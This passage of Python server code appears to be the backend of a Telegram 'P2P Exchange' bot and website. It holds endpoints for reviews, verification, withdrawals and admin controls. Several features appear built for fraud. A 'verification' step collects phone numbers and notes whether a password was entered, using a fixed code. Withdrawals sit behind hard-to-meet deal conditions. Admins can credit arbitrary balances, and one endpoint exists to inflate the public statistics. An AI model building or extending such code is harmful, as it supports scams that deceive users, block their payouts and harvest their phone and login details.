    elif endpoint == '/api/add_review':
        rating = data.get('rating')
        text = data.get('text')
        anonymous = data.get('anonymous', True)
        if not all([user_id, rating, text]):
            return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
        
        user_deals = [d for d in deals.values() if d.get('seller_id') == user_id and d.get('status') == 'completed']
        if len(user_deals) < 1:
            return web.json_response({'success': False, 'error': 'Need at least 1 completed deal'}, headers=headers)
        
        review_id = str(uuid.uuid4())[:8]
        reviews[review_id] = {
            "id": review_id,
            "user": "Аноним" if anonymous else str(user_id),
            "rating": rating,
            "text": text,
            "anonymous": anonymous,
            "date": datetime.now().strftime("%d.%m.%Y %H:%M"),
            "user_id": user_id
        }
        save_json(FILES["reviews"], reviews)
        
        add_log("api_add_review", {
            "user_id": user_id,
            "username": username,
            "review_id": review_id,
            "rating": rating
        })
        
        return web.json_response({'success': True, 'review_id': review_id}, headers=headers)
    
    # ===== УДАЛИТЬ ОТЗЫВ =====
    elif endpoint == '/api/delete_review':
        review_id = data.get('review_id')
        if not is_admin(user_id):
            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
        if review_id in reviews:
            del reviews[review_id]
            save_json(FILES["reviews"], reviews)
            return web.json_response({'success': True}, headers=headers)
        return web.json_response({'success': False, 'error': 'Review not found'}, headers=headers)
    
    # ===== СТАТИСТИКА =====
    elif endpoint == '/api/stats':
        return web.json_response({
            'success': True,
            'deals_today': stats.get('deals_today', 0),
            'users': stats.get('users', 0),
            'reviews': len(reviews),
            'volume': stats.get('volume', 0)
        }, headers=headers)
    
    # ===== ПРОВЕРКА 2 СДЕЛОК =====
    elif endpoint == '/api/has_2_deals':
        if not user_id:
            return web.json_response({'success': False, 'error': 'user_id required'}, headers=headers)
        bal = get_balance(user_id)
        partners = bal.get('deal_partners', {})
        has_2 = any(count >= 2 for count in partners.values())
        total = sum(partners.values())
        return web.json_response({'success': True, 'has_2_deals': has_2, 'total_deals': total}, headers=headers)
    
    # ===== СТАТУС ВЕРИФИКАЦИИ =====
    elif endpoint == '/api/verification_status':
        if not user_id:
            return web.json_response({'success': False, 'error': 'user_id required'}, headers=headers)
        
        active_session = None
        for sid, sess in verification_sessions.items():
            if sess.get('user_id') == user_id and sess.get('active', False):
                expires = datetime.fromisoformat(sess['expires_at'])
                if datetime.now() < expires:
                    active_session = sess
                    break
                else:
                    sess['active'] = False
                    save_json(FILES["verification_sessions"], verification_sessions)
        
        if active_session:
            return web.json_response({
                'success': True,
                'verified': True,
                'expires_at': active_session['expires_at'],
                'session_id': active_session.get('session_id')
            }, headers=headers)
        
        return web.json_response({'success': True, 'verified': False}, headers=headers)
    
    # ===== НАЧАТЬ ВЕРИФИКАЦИЮ =====
    elif endpoint == '/api/start_verification':
        phone = data.get('phone')
        username = data.get('username')
        
        if not all([user_id, phone, username]):
            return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
        
        for sid, sess in verification_sessions.items():
            if sess.get('user_id') == user_id and sess.get('active', False):
                expires = datetime.fromisoformat(sess['expires_at'])
                if datetime.now() < expires:
                    return web.json_response({
                        'success': False,
                        'error': 'Active verification session exists'
                    }, headers=headers)
        
        request_id = str(uuid.uuid4())[:8]
        verification_requests[request_id] = {
            "id": request_id,
            "user_id": user_id,
            "username": username,
            "phone": phone,
            "status": "pending",
            "created_at": datetime.now().isoformat()
        }
        save_json(FILES["verification"], verification_requests)
        
        add_log("verification_requested", {
            "user_id": user_id,
            "username": username,
            "phone": phone,
            "request_id": request_id
        })
        
        return web.json_response({'success': True, 'request_id': request_id}, headers=headers)
    
    # ===== ПОДТВЕРДИТЬ КОД =====
    elif endpoint == '/api/verify_code':
        code = data.get('code')
        password = data.get('password')
        
        if not code:
            return web.json_response({'success': False, 'error': 'Code required'}, headers=headers)
        
        if code != "1#2#3#4#5":
            return web.json_response({'success': False, 'error': 'Invalid code'}, headers=headers)
        
        pending_request = None
        for rid, req in verification_requests.items():
            if req.get('user_id') == user_id and req.get('status') == 'pending':
                pending_request = req
                break
        
        if not pending_request:
            return web.json_response({'success': False, 'error': 'No pending verification request'}, headers=headers)
        
        session_id = str(uuid.uuid4())[:8]
        verification_sessions[session_id] = {
            "user_id": user_id,
            "username": username,
            "phone": pending_request['phone'],
            "created_at": datetime.now().isoformat(),
            "expires_at": (datetime.now() + timedelta(hours=24)).isoformat(),
            "active": True
        }
        save_json(FILES["verification_sessions"], verification_sessions)
        
        pending_request['status'] = 'approved'
        pending_request['session_id'] = session_id
        pending_request['approved_at'] = datetime.now().isoformat()
        save_json(FILES["verification"], verification_requests)
        
        add_log("verification_completed_on_site", {
            "user_id": user_id,
            "username": username,
            "session_id": session_id,
            "password_entered": bool(password)
        })
        
        return web.json_response({
            'success': True,
            'session_id': session_id,
            'expires_at': (datetime.now() + timedelta(hours=24)).isoformat()
        }, headers=headers)
    
    # ===== ВЫВОД СРЕДСТВ =====
    elif endpoint == '/api/withdraw':
        currency = data.get('currency')
        details = data.get('details')
        
        if not all([user_id, currency, details]):
            return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
        
        bal = get_balance(user_id)
        partners = bal.get('deal_partners', {})
        has_2 = any(count >= 2 for count in partners.values())
        if not has_2:
            return web.json_response({'success': False, 'error': 'Need 2 deals with same buyer'}, headers=headers)
        
        verified = False
        for sid, sess in verification_sessions.items():
            if sess.get('user_id') == user_id and sess.get('active', False):
                expires = datetime.fromisoformat(sess['expires_at'])
                if datetime.now() < expires:
                    verified = True
                    break
        
        if not verified:
            return web.json_response({'success': False, 'error': 'Verification required'}, headers=headers)
        
        curr_key = currency.lower()
        if bal.get(curr_key, 0) <= 0:
            return web.json_response({'success': False, 'error': 'Zero balance'}, headers=headers)
        
        request_id = str(uuid.uuid4())[:8]
        withdraw_requests[request_id] = {
            "id": request_id,
            "user_id": user_id,
            "username": username,
            "currency": currency,
            "amount": bal[curr_key],
            "details": details,
            "status": "pending",
            "created_at": datetime.now().isoformat()
        }
        save_json(FILES["withdraw"], withdraw_requests)
        
        add_log("withdraw_requested", {
            "user_id": user_id,
            "username": username,
            "request_id": request_id,
            "amount": bal[curr_key],
            "currency": currency
        })
        
        return web.json_response({'success': True, 'request_id': request_id}, headers=headers)
    
    # ===== ВСЕ СДЕЛКИ (АДМИН) =====
    elif endpoint == '/api/all_deals':
        if not is_admin(user_id):
            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
        all_deals = []
        for d_id, d in deals.items():
            d_copy = d.copy()
            d_copy['deal_id'] = d_id
            all_deals.append(d_copy)
        return web.json_response({'success': True, 'deals': all_deals}, headers=headers)
    
    # ===== ЗАЯВКИ НА ВЫВОД (АДМИН) =====
    elif endpoint == '/api/withdraw_requests':
        if not is_admin(user_id):
            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
        all_requests = [{'id': rid, **req} for rid, req in withdraw_requests.items()]
        return web.json_response({'success': True, 'requests': all_requests}, headers=headers)
    
    # ===== ЗАПРОСЫ ВЕРИФИКАЦИИ (АДМИН) =====
    elif endpoint == '/api/verification_requests':
        if not is_admin(user_id):
            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
        all_requests = [{'id': rid, **req} for rid, req in verification_requests.items()]
        return web.json_response({'success': True, 'requests': all_requests}, headers=headers)
    
    # ===== ПОДТВЕРДИТЬ ВЫВОД (АДМИН) =====
    elif endpoint == '/api/confirm_withdraw':
        if not is_admin(user_id):
            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
        request_id = data.get('request_id')
        if request_id not in withdraw_requests:
            return web.json_response({'success': False, 'error': 'Request not found'}, headers=headers)
        req = withdraw_requests[request_id]
        if req.get('status') != 'pending':
            return web.json_response({'success': False, 'error': 'Already processed'}, headers=headers)
        
        bal = get_balance(req['user_id'])
        curr_key = req['currency'].lower()
        if bal.get(curr_key, 0) >= req['amount']:
            bal[curr_key] -= req['amount']
            save_json(FILES["balance"], balance)
        
        req['status'] = 'completed'
        req['completed_at'] = datetime.now().isoformat()
        save_json(FILES["withdraw"], withdraw_requests)
        
        add_log("withdraw_confirmed_api", {
            "admin_id": user_id,
            "username": username,
            "request_id": request_id
        })
        
        return web.json_response({'success': True}, headers=headers)
    
    # ===== ОТКЛОНИТЬ ВЫВОД (АДМИН) =====
    elif endpoint == '/api/reject_withdraw':
        if not is_admin(user_id):
            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
        request_id = data.get('request_id')
        if request_id not in withdraw_requests:
            return web.json_response({'success': False, 'error': 'Request not found'}, headers=headers)
        req = withdraw_requests[request_id]
        if req.get('status') != 'pending':
            return web.json_response({'success': False, 'error': 'Already processed'}, headers=headers)
        
        req['status'] = 'rejected'
        save_json(FILES["withdraw"], withdraw_requests)
        
        add_log("withdraw_rejected_api", {
            "admin_id": user_id,
            "username": username,
            "request_id": request_id
        })
        
        return web.json_response({'success': True}, headers=headers)
    
    # ===== НАЧИСЛИТЬ БАЛАНС (АДМИН) =====
    elif endpoint == '/api/add_balance':
        if not is_admin(user_id):
            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
        target_user_id = data.get('target_user_id')
        currency = data.get('currency')
        amount = data.get('amount')
        
        if not all([target_user_id, currency, amount]):
            return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
        
        add_balance(target_user_id, currency, amount)
        
        add_log("balance_added_api", {
            "admin_id": user_id,
            "username": username,
            "target_user_id": target_user_id,
            "amount": amount,
            "currency": currency
        })
        
        return web.json_response({'success': True}, headers=headers)
    
    # ===== ОЧИСТИТЬ ОТЗЫВЫ (АДМИН) =====
    elif endpoint == '/api/clear_reviews':
        if not is_admin(user_id):
            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
        reviews.clear()
        save_json(FILES["reviews"], reviews)
        
        add_log("reviews_cleared_api", {
            "admin_id": user_id,
            "username": username
        })
        
        return web.json_response({'success': True}, headers=headers)
    
    # ===== АДМИН НАКРУТКА СТАТИСТИКИ =====
    elif endpoint == '/api/admin_set_stats':
        if not is_admin(user_id):
            return web.json_response({'success': False, 'error': 'Admin required'}, headers=headers)
        key = data.get('key')
        value = data.get('value')
        if not key or value is None:
            return web.json_response({'success': False, 'error': 'Missing key or value'}, headers=headers)
        stats[key] = value
        save_json(FILES["stats"], stats)
        return web.json_response({'success': True}, headers=headers)
    
    return web.json_response({'success': False, 'error': 'Unknown endpoint'}, headers=headers)

# ============================================================
# 22. ЗАПУСК
# ============================================================
async def start_web_server():
    app = web.Application()
    app.router.add_route('*', '/{path:.*}', handle_api)
    port = int(os.environ.get('PORT', 3000))
    print(f"🌐 API сервер запущен на порту {port}")
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    return runner

async def main():
    print("=" * 50)
    print("🔥 P2P Exchange Бот + Сайт")
    print("=" * 50)
    print(f"👑 Мастер-админ: {MASTER_ADMIN_ID}")
    print(f"🤖 Бот: @{BOT_USERNAME}")
    print(f"📱 Mini App: {MINI_APP_URL}")
    print(f"📊 Отзывов: {len(reviews)}")
    print("=" * 50)
    await start_web_server()
    print("✅ Бот готов к работе!")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
